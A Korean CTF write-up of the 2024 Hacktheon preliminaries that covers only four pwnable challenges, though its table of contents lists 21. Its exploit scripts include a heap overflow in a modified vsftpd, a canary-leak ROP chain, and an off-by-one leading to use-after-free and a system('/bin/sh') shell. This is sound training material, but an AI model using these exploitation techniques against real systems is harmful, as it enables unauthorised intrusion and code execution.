---
title: 2024 Hacktheon 예선전 풀이
description: 2024 핵테온 세종 사이버보안 경진대회 예선 풀이입니다.
date: 2024-07-01 02:17:33 +0900
tags: [CTF]
categories: [Tech, CTF]
comments: false
math: true
mermaid: false
pin: false
---

## 목차

1. Pwnable - Finddiff
2. Pwnable - Intelitigation
3. Pwnable - Account
4. Pwnable - chainrpc
5. Web - Revact
6. Web - GithubReadme
7. Web - DogGallery
8. Reversing - Decrypt Message 1
9. Reversing - Decrypt Message 2
10. Forensic - PNG
11. Forensic - Rumor1
12. Forensic - Rumor2
13. Forensic - Rumor3
14. Forensic - Rumor4
15. Forensic - Rumor5
16. Forensic - Tracker1
17. Forensic - Tracker2
18. Forensic - Tracker3
19. Misc - MS office
20. Misc - Confidential
21. Misc - stegoART

---

## 1. Pwnable - Finddiff

기본적으로 `vsftp`, `vvsftp`라는 두 개의 바이너리를 제공해줍니다. 문제의 이름과 제공된 파일에서 눈치챌 수 있듯이, binary diffing을 통해 실제 파일과 문제를 위해 제공된 파일의 차이로 취약점을 찾아내는 문제입니다.

우선 바로 diffing을 시도해봅시다. IDA의 `bindiff`라는 툴 혹은 `diaphora`를 이용해서 diffing을 진행할 수 있습니다. 저는 diaphora라는 툴을 통해 diffing해보겠습니다.
![diffing](/assets/img/hacktheon2024/diffing.png)


결과를 확인해보면, `getFlag`라는 함수가 추가된 것을 볼 수 있습니다. (이외의 함수들은 큰 의미가 없습니다.) 

```c
void __cdecl __noreturn getFlag()
{
  int fd; // [rsp+Ch] [rbp-34h]
  char flag[32]; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 v2; // [rsp+38h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  fd = open("flag", 0);
  memset(flag, 0, sizeof(flag));
  read(fd, flag, 0x20uLL);
  printf("500 OOPS: %s\n", flag);
  exit(1);
}
```
함수를 분석해보니, 그냥 flag를 읽어 출력해주는 함수입니다. 우리는 이 함수를 호출하는 방법을 찾아야 합니다. 그래서 cross-reference를 진행해보면 `init_connection`이라는 함수 내에서 reference가 있음을 확인할 수 있습니다.

```c
void __cdecl __noreturn init_connection(vsf_session *p_sess)
{
  signal(11, getFlag);
  if ( tunable_setproctitle_enable )
    vsf_sysutil_setproctitle("not logged in");
  vsf_cmdio_set_alarm(p_sess);
  check_limits(p_sess);
  if ( tunable_ssl_enable && tunable_implicit_ssl )
    ssl_control_handshake(p_sess);
  if ( tunable_ftp_enable )
    emit_greeting(p_sess);
  parse_username_password(p_sess);
}
```
함수를 확인해보니, 맨 첫 줄에서 signal함수를 통해 `Segmentation Fault` signal이 발생한 경우 `getFlag`함수가 호출되게끔 설정된 것을 알 수 있습니다.

사실 segmentation fault는 쉽게 트리거할 수 있지만(문제 난이도도 아주 쉽다고 설명에 적혀있었기 때문에 유추할 수 있는 부분이었습니다.), diffing을 진행한 결과에 있는 함수들에서는 어떤 함수로 이를 트리거 해야할지 판단하기 어렵습니다. 때문에 저의 경우에는 `strace` 명령어를 통해 입력을 하는 부분들을 따라가보기로 했습니다.
![strace](/assets/img/hacktheon2024/syscall_tracing.png)
확인해보면 유저의 입력 이후에 `"Please login with USER and PASS."`라는 string을 출력해줌을 알 수 있었고, 이 string을 기반으로 입력을 시작하는 부분을 분석했습니다.
```c
void __cdecl __noreturn parse_username_password(vsf_session *p_sess)
{
  while ( 1 )
  {
    while ( 1 )
    {
      vsf_cmdio_get_cmd_and_arg(p_sess, &p_sess->ftp_cmd_str, &p_sess->ftp_arg_str, 1);
      ...
      else
      {
        ...
        else if ( !str_isempty(&p_sess->ftp_cmd_str) || !str_isempty(&p_sess->ftp_arg_str) )
        {
          if ( str_equal_text(&p_sess->ftp_cmd_str, "GET")
            || str_equal_text(&p_sess->ftp_cmd_str, "POST")
            || str_equal_text(&p_sess->ftp_cmd_str, "HEAD")
            || str_equal_text(&p_sess->ftp_cmd_str, "OPTIONS")
            || str_equal_text(&p_sess->ftp_cmd_str, "CONNECT") )
          {
            vsf_cmdio_write_exit(p_sess, 500, "HTTP protocol commands not allowed.", 1);
          }
          if ( ++p_sess->prelogin_errors > 10 )
            vsf_cmdio_write_exit(p_sess, 500, "Too many errors.", 1);
          vsf_cmdio_write(p_sess, 530, "Please login with USER and PASS.");
        }
        ...
      }
    }
    ...
  }
}
```
코드를 확인해보면, `vsf_cmdio_get_cmd_and_arg`함수에서 입력을 받고, 여러 if condition을 거친 이후에 `vsf_cmdio_write(p_sess, 530, "Please login with USER and PASS.");` 구문이 실행되었다는 것을 알아낼 수 있습니다.
```c
void __cdecl vsf_cmdio_get_cmd_and_arg(vsf_session *p_sess, mystr *p_cmd_str, mystr *p_arg_str, int set_alarm)
{
  int ret; // [rsp+2Ch] [rbp-4h]

  if ( set_alarm )
    vsf_cmdio_set_alarm(p_sess);
  ret = control_getline(p_cmd_str, p_sess)
  ...
}
```
`vsf_cmdio_get_cmd_and_arg`함수는 `control_getline`함수로 입력을 받는 것을 확인할 수 있고..
```C
int __cdecl control_getline(mystr *p_str, vsf_session *p_sess)
{
  unsigned int len; // [rsp+18h] [rbp-8h]
  int ret; // [rsp+1Ch] [rbp-4h]

  if ( !p_sess->p_control_line_buf )
    vsf_secbuf_alloc(&p_sess->p_control_line_buf, 0x1000u);
  ret = ftp_getline(p_sess, p_str, p_sess->p_control_line_buf);
}
```
또 그 함수 내부에서는 `ftp_getline`을 호출함을 알 수 있습니다.
```c
int __cdecl ftp_getline(vsf_session *p_sess, mystr *p_str, char *p_buf)
{
  int ret; // [rsp+2Ch] [rbp-14h]
  int (*p_peek)(vsf_session *, char *, unsigned int); // [rsp+30h] [rbp-10h]
  int (*p_read)(vsf_session *, char *, unsigned int); // [rsp+38h] [rbp-8h]

  if ( p_sess->control_use_ssl && p_sess->ssl_slave_active )
  {
    priv_sock_send_cmd(p_sess->ssl_consumer_fd, 4);
    ret = priv_sock_get_int(p_sess->ssl_consumer_fd);
    if ( ret >= 0 )
      priv_sock_get_str(p_sess->ssl_consumer_fd, p_str);
    return ret;
  }
  else
  {
    p_peek = plain_peek_adapter;
    p_read = plain_read_adapter;
    if ( !p_sess->control_use_ssl )
      return str_netfd_alloc(p_sess, p_str, 10, p_buf, 0x4000u, p_peek, p_read);
    p_peek = ssl_peek_adapter;
    p_read = ssl_read_adapter;
    return str_netfd_alloc(p_sess, p_str, 10, p_buf, 0x4000u, p_peek, p_read);
  }
}
```

마지막으로, `ftp_getline`함수를 분석해보면, `plain_peek/read_adapter`함수를 통하여 peek, read를 진행하는 것을 알 수 있습니다.

이 부분을 vsftpd 바이너리와 vvsftpd 바이너리를 따로 열어 분석해보면 `str_netfd_alloc`함수의 `max_len`인자가 vsftpd 바이너리는 `0x1000`이지만 vvsftpd 바이너리는 지금 보이는 것처럼 `0x4000`인 것을 확인할 수 있습니다.
그리고 다시 앞으로 돌아가 `control_getline`함수를 보게되면 `vsf_secbuf_alloc`함수를 통해 우리의 입력 버퍼를 0x1000만큼 할당했음을 알 수 있습니다.

즉, 문제로 제공된 바이너리에서는 `str_netfd_alloc`함수 내부에서 plain_read_adapter함수를 통해 입력을 받을 때, `0x1000`만큼 할당된 공간에 `0x4000`만큼의 입력을 받게되어 간단하게 heap overflow를 발생시킬 수 있음을 알 수 있습니다!

remote와의 설정차이 때문에, local에서는 flag가 출력되지 않아서, child process에 strace를 attach하고 결과를 확인해보면...
![getFlag](/assets/img/hacktheon2024/getFlag.png)

위와같이 flag를 open하는 것을 확인할 수 있습니다!

```python
from pwn import *

#p = remote('13.125.107.131', 5000, level='debug')
p = remote('0', 21, level='debug')

p.sendline('USER anonymous')
pause()
p.sendline(b'A'*0x1000)

p.interactive()
```

분석에는 시간이 좀 걸렸지만, 실제로 바이너리에 0x1000 이상 크기의 버퍼를 입력하게 되면 `flag`를 획득할 수 있는 간단한 문제였습니다.

## 2. Pwnable - Intelitigation

해당 문제에서 nc로 접속하면 Base64형식을 복호화해주면 바이너리를 획득할 수 있고, 해당 바이너리를 exploit하는 방식이다.

nc 접속해서 바이너리를 받아올 때 매번 data 영역의 idx와 canary 값들이 바뀐다. data영역의 주소는 그대로다.
![](/assets/img/hacktheon2024/go3.png)

.init_array 섹션에 아래 함수들이 존재하는데, 랜덤한 카나리 값과 idx의 canary 값을 가져오고, 세팅해준다.
```c
__int64 sub_12D9()
{
  return canary[idx];
}
```

sub_12D9에서 받은 카나리 값을 fs:0x28의 canary에 직접 써서 값을 변경해주는 부분이다.
```c
unsigned __int64 __fastcall sub_12BD(unsigned __int64 a1)
{
  unsigned __int64 result; // rax

  result = a1;
  __writefsqword(0x28u, a1);
  return result;
}
```

main 로직에서는 Buffer Overflow가 발생해 pie주소 leak이 가능했고, canary값을 알고 있으므로 ROP를 수행할 수 있다.

```c
unsigned __int64 sub_1324()
{
  __int64 buf[2]; // [rsp+0h] [rbp-210h] BYREF
  char v2[496]; // [rsp+10h] [rbp-200h] BYREF
  unsigned __int64 v3; // [rsp+208h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("input> ");
  buf[0] = 0LL;
  buf[1] = 0LL;
  memset(v2, 0, sizeof(v2));
  read(0, buf, 0x300uLL);
  printf("Your input> ");
  printf("%s", (const char *)buf);
  return v3 - __readfsqword(0x28u);
}
```

open, read, write해주는 함수가 존재했다. 해당 함수를 이용해서 flag파일을 읽으면 될 것으로 판단했다.
```c
ssize_t __fastcall sub_124E(const char *a1)
{
  int fd; // [rsp+1Ch] [rbp-4h]

  fd = open(a1, 0);
  read(fd, &unk_40C0, 0x64uLL);
  return write(1, &unk_40C0, 0x64uLL);
}
```

ROP Gadget중 `mov rdi, rsp ; pop r8 ; ret`를 활용해 rdi 레지스터를 세팅할 수 있었고, sub_124E를 호출해주면 된다.

```py
from pwn import *
import base64

p = remote('hto2024-nlb-fa01ec5dc40a5322.elb.ap-northeast-2.amazonaws.com',5001)
p.recvline()
p.recvline()
data = base64.b64decode(p.recvline().strip())

with open('binary.bin','wb') as f:
    f.write(data)
    e = ELF("./binary.bin")
    idx = ord(e.read(0x0000000000004070, 1))
    canary = e.read(0x0000000000004020+(idx*8), 8)

    pay = b'A'*520 + canary + b'B'*8 + b'\xf2'
    p.send(pay)
    p.recvuntil(b'B'*8)
    
    pie_leak = u64(b'\x00'*1+p.recv(6)[1:]+b'\x00\x00')
    print(hex(pie_leak))
    pie_base = pie_leak - 0x1300
    print(hex(pie_base))

    # 0x00000000000012b4 : mov rdi, rsp ; pop r8 ; ret

    pay2 = b'A'*520 + canary + b'B'*8 + p64(pie_base + 0x00000000000012b4) + b'./flag\x00\x00' + p64(pie_base+0x124E)

    p.send(pay2)

p.interactive()
```

## 3. Pwnable - Account

이 문제는 자체적으로 구성한 간단한 bytecode로 account와 group들을 생성 및 제거할 수 있는 프로그램입니다. 분석은 간단합니다.

해당 바이너리에는 다음 7가지의 기능이 있습니다.
1. add account
2. remove account
3. edit account
4. add group
5. add account in group (그룹에 계정 추가)
6. remove account in group (그룹에서 계정 삭제)
7. print accounts

또한, 입력 포맷은  `| feature(1byte) | args |`의 형태로 이뤄지며 모든 값은 raw value입니다.

`account`는, `unicode type`과 `ascii type`이라는 두 가지의 타입이 존재합니다. 아시다시피 unicode는 한 글자가 2bytes이며, ascii는 1byte라는 차이가 있습니다.

`add account`와 `edit account`를 우선적으로 분석해보겠습니다.
```c
__int64 __fastcall add_acc(char acc_type, char *a2)
{
  char *dest; // [rsp+10h] [rbp-30h]
  account *v4; // [rsp+18h] [rbp-28h]
  int v5; // [rsp+20h] [rbp-20h]
  int v6; // [rsp+20h] [rbp-20h]
  int v7; // [rsp+20h] [rbp-20h]
  int i; // [rsp+24h] [rbp-1Ch]

  for ( i = 0; ; ++i )
  {
    if ( i >= 16 )
    {
      fprintf(stderr, "no more account\n");
      return -1;
    }
    if ( !ACCOUNTS_6050[i] )
      break;
  }
  if ( !acc_type )
  {
    v7 = unicode_len(a2);
    if ( !v7 )
      goto LABEL_7;
    v6 = 2 * (v7 + 1);
    goto LABEL_12;
  }
  if ( acc_type != 1 )
    goto LABEL_11;
  v5 = strlen(a2);
  if ( !v5 )
  {
LABEL_7:
    fprintf(stderr, "invalid length\n");
    return -1;
  }
  v6 = v5 + 1;
LABEL_12:
  v4 = alloc_buf(0x18);
  dest = alloc_buf(v6);
  if ( dest && v4 )
  {
    v4->type = acc_type;
    v4->ref_cnt = 0;
    v4->data = dest;
    if ( !acc_type )
    {
      copy_unicode(dest, a2);
      goto LABEL_20;
    }
    if ( acc_type == 1 )
    {
      strcpy(dest, a2);
LABEL_20:
      ACCOUNTS_6050[i] = v4;
      inc_refcnt(i);
      return i;
    }
LABEL_11:
    fprintf(stderr, "invalid account type\n");
    return -1;
  }
  fprintf(stderr, "failed to allocate memory\n");
  return -1;
}
```
add account함수는 위와 같이 구현되어있습니다.
`ACCOUNTS_6050` 전역변수의 배열에 0~15까지의 모든 index를 순회하며, 할당되지 않은 공간에 account 할당을 시도합니다. 
우리가 입력한 `account type`을 통해 해당 type이 unicode라면, `unicode_len`함수를 통해 길이를 구하고, 그 값에서 1을 더한 값에 2를 곱하여 size를 걸정합니다. ascii type인 경우에는 `strlen(buf)+1`을 반환합니다. 즉, 한 글자 만큼의 여유공간을 남겨둔 상태로 공간을 할당합니다.
그 이후 입력받은 버퍼를 공간에 복사하는데, unicode를 copy를 할 때에는 별도의 함수로 copy를 진행합니다.
`copy_unicode`도 추가적으로 분석해봅시다.

```C
_BYTE *__fastcall copy_unicode(_BYTE *a1, _BYTE *a2)
{
  bool is; // [rsp+17h] [rbp-29h]
  _BYTE *i; // [rsp+20h] [rbp-20h]

  for ( i = a1; ; i += 2 )
  {
    is = 1;
    if ( !*a2 )
      is = a2[1] != 0;
    if ( !is )
      break;
    *i = *a2;
    i[1] = a2[1];
    a2 += 2;
  }
  *i = 0;
  i[1] = 0;
  return a1;
}
```

버퍼를 모두 복사한 이후, 마지막에 null을 한 글자 더 추가함을 알 수 있습니다.

취약점은 `edit account`기능에 존재합니다.

```C
__int64 __fastcall edit_acc(char write_type, unsigned __int8 a2, char *a3)
{
  unsigned int len; // [rsp+Ch] [rbp-24h]
  account *v5; // [rsp+10h] [rbp-20h]

  if ( a2 < 0x10u )
  {
    v5 = ACCOUNTS_6050[a2];
    if ( v5 )
    {
      if ( v5->type )
      {
        if ( v5->type != 1 )
        {
LABEL_8:
          fprintf(stderr, "unexpected\n");
          return -1;
        }
        len = strlen(v5->data) + 1;
      }
      else
      {
        len = 2 * (unicode_len(v5->data) + 1);
      }
      if ( !write_type )
      {
        if ( 2 * unicode_len(a3) >= len )
          goto LABEL_12;
        copy_unicode(v5->data, a3);
        v5->type = 0;
        goto LABEL_17;
      }
      if ( write_type == 1 )
      {
        if ( strlen(a3) >= len )
        {
LABEL_12:
          fprintf(stderr, "invalid length\n");
          return -1;
        }
        strcpy(v5->data, a3);
        v5->type = 1;
LABEL_17:
        print_val(v5);
        return 0;
      }
      goto LABEL_8;
    }
  }
  fprintf(stderr, "invalid account id\n");
  return -1;
}
```

함수를 분석해보면, 이전에 우리가 할당한 account의 타입이 unicode든 ascii든 상관없이 원하는 type대로 값을 edit할 수 있습니다. 하지만 길이 검사를 할당된 type에 따라 진행하여, 입력 버퍼와의 길이를 비교한 후 복사를 진행합니다.

여기서 우리는 취약점을 발생시킬 수 있습니다.

만약 우리가 ascii type의 0x18만큼의 글자 길이를 가지는 account를 하나 생성했다고 가정해봅시다. 그럼, buffer는 0x19만큼 공간할당이 됩니다.

이 때, 우리가 해당 account를 unicode type으로 edit을 한다면 어떻게 될까요?
만일 우리가 unicode type으로 12글자, 즉 24(0x18)bytes만큼을 입력하게 된다면, 앞서 할당된 0x19bytes의 공간 제한은 통과하게 되지만 0x18bytes를 복사한 이후 2bytes의 null byte를 채워넣는 로직에 의해 1byte의 `off-by-one` 취약점이 발생하게 됩니다.
즉, 아래와 같은 상태가 됩니다.

![offbyone](/assets/img/hacktheon2024/1.png)


이 바이너리에는 다양한 구조체들이 존재하며, 그 값들이 raw value 저장 및 구분되기 때문에, 이 off-by-one 취약점으로 인해 구조체들의 변조가 가능해집니다.

(주요 구조체들은 아래와 같이 구성되어있습니다.)
```c
struct account
{
  _BYTE type;
  _BYTE ref_cnt;
  char *data;
  _QWORD c;
};
struct group
{
  _DWORD acc_cnt;
  account **accs;
  void *vtable;
};
```

구조체 변조 이후에는 원하는 exploit plan을 세워서 마무리하면 됩니다.

제 exploit 과정은 아래와 같습니다.
1. memory map leak
1.1 두 개의 ascii account를 할당
1.2. off-by-one 취약점을 통해, 두 번째 ascii account를 unicode type으로 변조
1.3. 하나의 추가적인 큰 크기를 가진 ascii account를 할당
1.4. 그룹 생성 및 큰 크기의 account를 그룹에 추가
1.5. 변조된 두 번째 account를 통해 그룹에 추가된 account의 reference count를 1로 조작
1.6. 그룹에서 account를 삭제하면, reference count가 0이 되므로 할당 해제되지만 account 배열 전역변수에는 존재
1.7 uaf를 통해 값 할당 이후 해당 값을 읽어들이면 memory leak. 
2. 위와 비슷한 과정을 반복하여 AAR, AAW를 획득
3. `environ leak`
4. `stack ROP`

위 과정을 거치며 shell을 획득할 수 있습니다.

```python
from pwn import *
from time import sleep
e = ELF('./account')
p = e.process(aslr=True)

sla = p.sendlineafter
sa = p.sendafter

def add_acc(_type, pay):
    p.send(b'\x00' + p8(_type) + pay + b'\x00')
    sleep(0.3)

def remove_acc(uid):
    p.send(b'\x01' + p8(uid))
    sleep(0.3)

def edit_acc(uid, _type, pay):
    p.send(b'\x02' + p8(uid) + p8(_type) + pay + b'\x00')
    sleep(0.3)

def add_grp():
    p.send(b'\x10\0\0\0\0')
    sleep(0.3)

def remove_grp(gid):
    p.send(b'\x11'+p8(gid))
    sleep(0.3)

def add_acc_in_grp(gid, uid) :
    p.send(b'\x12' + p8(gid) + p8(uid))
    sleep(0.3)

def remove_acc_in_grp(gid, uid):
    p.send(b'\x13' + p8(gid) + p8(uid))
    sleep(0.3)

def print_all(gid):
    p.send(b'\x14' + p8(gid))
    sleep(0.3)


add_grp()
add_acc(1, b'A'*0x18)           # 0
add_acc(1, b'ipwnnn')           # 1
edit_acc(0, 0, b'A'*0x17)

add_acc(1, b'B'*0x7f)           # 2
add_acc_in_grp(0, 2)
edit_acc(1, 0, b'ipwnnnA\1\1')
remove_acc_in_grp(0, 2)
add_grp()
add_acc_in_grp(1, 0)
add_acc_in_grp(0, 2)

print_all(0)
p.recvuntil(b'\x98')
maps = u64(b'\x98' + p.recv(5) + b'\0\0') - 0x98
log.info('[MAPS] %#x'%maps)

add_acc(1, b'A'*0x18)           # 3
add_acc(1, b'A'*0x6)            # 4
add_acc(1, b'A'*0x17)           # 5

edit_acc(3, 0, b'A'*0x17)
add_acc_in_grp(0, 5)
edit_acc(4, 0, b'A'*0x6 + b'\0\1\1')
remove_acc(4)
remove_acc_in_grp(0, 5)
add_acc(1, b'A'*0x17)           # 4
add_acc_in_grp(0, 5)
edit_acc(4, 1, b'\x01'*0xf)
edit_acc(4, 1, b'\x01'*8 + p64(maps + 0x10))

p.recvuntil(b'\x01'*8)
p.recvuntil(b'\x01'*8)
p.recv(7)
print_all(0)
p.recv(6)
pie = u64(p.recv(6) + b'\0\0') - 0x6010
log.info('[PIE] %#x'%pie)

edit_acc(4, 1, b'\x01'*8 + p64(pie + 0x5f70))
print_all(0)
p.recvuntil(b'\x01'*8)
p.recv(13)
libc = u64(p.recv(6) + b'\0\0') - 0x19ecb0
log.info('[GLIBC] %#x'%libc)

prdi = libc + 0x16da6b
system = libc + 0x50d70
binsh = libc + 0x1d8678

edit_acc(4, 0, b'\0' + b'\x01'*7 + p64(libc + 0x2221ff))
print_all(0)
stack = u64(p.recvuntil(b'\x7f')[-6:] + b'\0\0') - 0x250
log.info('[STACK] %#x'%stack)

edit_acc(4, 0, b'\x01'*8 + p64(pie + 0x6150))
print_all(0)
p.recvuntil(b'\x01'*8)
p.recv(13)
heap = u64(p.recv(6) + b'\0\0') - 0x2a0
log.info('[HEAP] %#x'%heap)

edit_acc(4, 0, b'\x01'*8 + p64(heap + 0x2f4))
edit_acc(5, 1, b'\xf0')
edit_acc(4, 0, b'\x01'*8 + p64(heap + 0x2f8))
edit_acc(5, 1, p64(stack -1))
edit_acc(4, 0, b'\x01'*8 + p64(heap + 0x2f0))
edit_acc(5, 1, b'\x02')
pause()
pay = b''
pay += b'\0' + p64(prdi+1) + p64(prdi) + p64(binsh) + p64(system)
pay = pay.ljust(0xee, b'A')
add_acc(0, pay)

p.interactive()
```

로직을 열심히 분석하지 않으면 놓칠 수 있는 취약점이기 때문에 처음 해킹대회를 입문하는 사람들이 풀어내기에는 어려울수도 있는 문제였다고 느껴지네요 :)

## 4. Pwnable - chainrpc

이 문제는 golang을 통해 blockchain rpc 를 구현해둔 문제입니다.

일반적으로 golang binary를 하나하나 전부 분석하기에는 상당히 많은 시간과 노력이 들기에, 가능한 적은 분석으로 문제를 푸는 방법을 소개할 예정입니다.


먼저 binary를 분석하기 앞서, symbol이 다 날라가있는 상태라 분석이 어렵습니다. 이 때 ida 의 lumina 혹은 https://github.com/SentineLabs/AlphaGolang 같은 도구를 사용해서 symbol을 복구하고 시작합니다.



바이너리를 분석을 시작할 때, 악성코드 문제등이 아닌경우 실행시켜보는것이 가장 쉽게 접근할 수 있습니다.

![img](/assets/img/hacktheon2024/z.png)

다음과 같이 실행을 해보면 입력을 받고, 해당 입력이 JSON 으로 되어야 한다는 사실 및 args 라는 key를 가져야 한다는 사실을 알 수 있습니다.



golang binary 경우 string에 의미있는 내용이 남아있을 확률이 높습니다. (golang structure, function definition, ...)

또한 golang에서 JSON 을 parsing 하기 위해서는 struct를 작성해주어야 하는데, 이를 string에서 찾아볼 수 있습니다.

![img](https://lh7-us.googleusercontent.com/slidesz/AGV_vUfbnVLU8Lazq6iXOZyfrEGXaEthJL1IM0XAh29W1Iyg01VdEDlhoFRRbe6QcScbh_XRnv7UGO2Lo4-7KogwPvmJGdF0HHmQR72RsL-gZ8vQT5uOhDr3ePMU6_uNuUeLRnrL9u8DayFCoNGicrVn9ddGWKjUW4JX=s2048?key=iBB5N8FSRKchO_hzOd9DYw)

이 때 vjson이라는 문장이 해당 structure를 구분할 수 있는 값이라 생각하고, 해당 값을 검색함으로 JSON의 필요한 field를 알 수 있습니다.

![img](https://lh7-us.googleusercontent.com/slidesz/AGV_vUcL_COfpnP419x4cmrX8vus_B0H06a3hEQJvOm5NOEviFyPsoUUr5cYJ__q0_dHvWEKwtdATUbqUrz-G2T0-Y7H9M0sca0MWcmB5RZSIHQkSmmG7fVxR1ZuMfXAOyKv9Pi4D9NT0nWFW871-grycI_Ah2HpieMT=s2048?key=iBB5N8FSRKchO_hzOd9DYw)



또한 해당 문제의 경우 nc 서버를 제공하였는데, reversing 문제에서 nc 서버를 제공해주는 경우는 flag 파일을 읽는 routine이 바이너리 내에 존재할 확률이 큽니다.

하지만 일반적인 ida string search 설정상으로는 flag 문자열이 보이지 않아, 설정을 통해 최소 검색 길이를 맞춰주어야 합니다.

![img](https://lh7-us.googleusercontent.com/slidesz/AGV_vUdOV--smt6O3lLuPdTcPWPxu8H3FIlra1JpUOp9IYVZ_ifU0qDbh4tSoOnT0hOBXujfLC-YWneePm4sT4wXWtw_TueLBCjAFb8zUZb7CJIYtS0wurjP5Ya7P2oacfjN6NjxLbfCli5gv8WtRs7N4Tpf-RZOWCjU=s2048?key=iBB5N8FSRKchO_hzOd9DYw)

맞춰 주게 되면 아래와 같이 검색이 가능한데, 이를 xref 를 통해 어디서 사용하는지 확인할 수 있습니다.

![img](https://lh7-us.googleusercontent.com/slidesz/AGV_vUe1N6GSAbfg_yOuhkmyR2Ikf0z7HrS1vLoko5jf2HaHLoVRpFxapbGMUqpIsjrgefxSYEITG8768Rot6qmciOy06zBadRBEdPOBDSWDoE2e5hjPsoRBN9YC0_5IcYNO7wTeM-DFR8RdgNEcySmYaMoHhu6K3qk=s2048?key=iBB5N8FSRKchO_hzOd9DYw)



![img](https://lh7-us.googleusercontent.com/slidesz/AGV_vUd4YlhTw0fbzii3aC3nj4anHqHHfv9S_9at_UQqJoBiaLPlNNvBBOZ2OVSjlvAyNyLAENKyjbgu1lSn7lq659HLFoQ-MJ0Xo85Sg8ooZKtcVAxpsQszKHtR_nUpT1iH7ytDd2qY-UPBmuZ2NtLBTWPbhZzrCwb0=s2048?key=iBB5N8FSRKchO_hzOd9DYw)

확인을 해보면 `math_big__Int_Cmp` 를 통해 특정 값과 비교 후 flag를 출력해주는 routine으로 가는걸 알 수 있습니다.



현재까지 알아낸것을 정리하면 아래와 같습니다.

1. 입력은 `{“type”: .., “args”: .., “from”: .., “hash”: ..}` 이다.
2. 특정 검사 이후 flag를 읽어주는 routine이 있다.



1번 내용을 조금 더 깊게 팔 이유가 있기에, 해당 부분을 임의 값을 채워서 입력해봅니다.

![img](https://lh7-us.googleusercontent.com/slidesz/AGV_vUcqNaG1e1XsTcJDBE5QoCFSpij-cB1arW3589otuhitr30AOh5htTVcLFwT37wSdU2Zag65HSdBk749SfQrtAM2Yo1Sew8V4oi2JUC60dTZmDVMEVkujLgs6YQEmBIx5VL8pH3TyW8YvaZUR_IFE2dy1n1KYPQo=s2048?key=iBB5N8FSRKchO_hzOd9DYw)

위 사진에서 type이 특정 type 이어야 한다는걸 알 수 있고, 여러가지를 넣다보면 숫자가 들어갔을 때 에러없이 정상적으로 실행되는걸 볼 수 있습니다.



여기까지 시작할 때 분석 없이 알아낼 수 있는 대부분을 알아내었습니다. 이 이후에는 크게 두가지 정도가 있는데, 

1. 바이너리를 하나하나 분석하기
2. 조금 더 분석 없이 알아내기 

정도를 진행해볼 수 있습니다. 저는 2번을 통해 진행하였습니다.



type이 숫자임을 알아냈기에, 1에서 시작해서 하나하나 넣어보며 진행합니다. 넣다보면 아래와 같이 파악할 수 있습니다.

```
1 ⇒ 어떤 account 를 출력
2 ⇒ not implement error 를 출력
3 ⇒ args file를 읽어서 출력
4 ⇒ 파악 불가
5 ⇒ 파악 불가
6 ⇒ 파악 불가
7 ⇒ 어떤 hash를 출력
```



여기서 3번을 보면 파일을 읽어주네? 하면 flag를 읽는 시도를 안해볼수가 없습니다.

![img](https://lh7-us.googleusercontent.com/slidesz/AGV_vUfAoAoy3KuiG881k6F9jl3j540o7Ku036KOYAukGJ0MVMsLo7D2tR5_BmQMBDn9f2Ep3jGuXZQynNeCmdcOx7G-0p1GjwvGJiHeQbksJpnqiAvDnxJLVXQuqs3S3x1jLjo-_BkNattWhzcvl0swIX7u8FC5_563=s2048?key=iBB5N8FSRKchO_hzOd9DYw)

당연히 실패합니다. 하지만 `Loading blockchain from file` 이라는 문구를 통해 특정 config를 읽어온다 생각할 수 있겠습니다. (실제로 config가 주어졌지만, remote에는 해당 파일이 없음으로 해당 기능은 의미가 없다 생각하고 진행하겠습니다.)



2번에서 not implement error 를 출력하는것을 토대로 대략적인 routine 시작점을 짚어낼 수 있습니다.

아까와 같이 string 검색 후 이를 xref 찍음으로써 다음과 같이 확인 가능합니다.

![img](https://lh7-us.googleusercontent.com/slidesz/AGV_vUcVozdz4BeF2Glo2Kksd9qzj69qYfw00n_qiK2LlzkOV7gseLfOd1BV6G2dUcHjR79DUilQ6Nz8pjuRZ4nVNfYaOVs6PkegkKRrGXzAFcves5DhRJl2zuCmdpFf5wSOm59sLB6aAiVtvUR5P9yhjLBLq9HO3yCk=s2048?key=iBB5N8FSRKchO_hzOd9DYw)



해당 CFG를 탐색하다보면 대략 저부분이 routine 인걸 알 수 있고, flag를 출력해주는 함수도 저 함수를 통해 가게 됩니다.

flag 를 출력해주는 함수에서 Sending transaction을 출력해주는데, 이쪽을 먼저 호출하는것을 목표로 합니다.

아까 탐색했던 type에서 4,5,6 번이 파악 불가였음으로 해당 부분을 위주로 아까처럼 손으로 값을 임의로 넣어봅니다.

![img](https://lh7-us.googleusercontent.com/slidesz/AGV_vUelC4b-vFp5cKyFtQjoKGkgzpgwY0KWyWlhUrF467hqes-AL05RC6JaUMxhK0h94OzjTV0un_7azbCCUMKc4gFBJDkgu3STEEo-du-04O3F5qmBX5gUU0SSeiVxSo-2eRsJjoQLXC1CG-E5NpZlaYz9psd0XhMV=s2048?key=iBB5N8FSRKchO_hzOd9DYw)

위와 같이 뜨게 되는데, 4번은 잘 모르는 값, 5번이 정상적으로 실행은 되지 않습니다.

5번의 경우 invalid account 라고 나오게 되는데, 주어진 config 파일에 account 관련된 부분이 있음 (account.json)으로 args에 해당 값을 넣어봅니다.

![img](https://lh7-us.googleusercontent.com/slidesz/AGV_vUdXuEGzaYJjgBh9O3NnnqB-2R53WYX2_4kSK9TGD1ajMY58cv5fmgdtU3nh2euiy3WILZ1djQHgUc_--IqfgvxR4oYTwH48GW0sx_pYRNqtcvRU0Ek9Uwj4NwnT1NRPoCqneaia6Ov3ZSlfKhXLI_BGAAnwT9w8=s2048?key=iBB5N8FSRKchO_hzOd9DYw)

그러면 blockchain not initialized 로 나오는 에러가 바뀌게 됩니다. 

그럼 blockchain을 초기화 해주어야 하는데, 4, 6 번이 현재 사용처가 마땅치 않음으로 해당 type을 대상으로 주어진 파일(blockchain.json)을 인자로 넣어 진행해봅니다.

![img](https://lh7-us.googleusercontent.com/slidesz/AGV_vUfLxdDajYNOkMIQTkXbT4ps6_JLBFYhY_q8Q8hU7Wq6f30iu9JQZdOB2MSCwMF7v2AMXWPWM5Fk4jsd1I9MIqZKt1IvhK3sl5kPfqB01DpnItA8cJzaEvCsDnhwIEYJU0F5Cg70NI5WGz1KeCLmrccYaN-r0vo7=s2048?key=iBB5N8FSRKchO_hzOd9DYw)

진행하게 되면 5번이 정상적으로 진행돼서 checking transaction이라는 문구가 나옵니다.

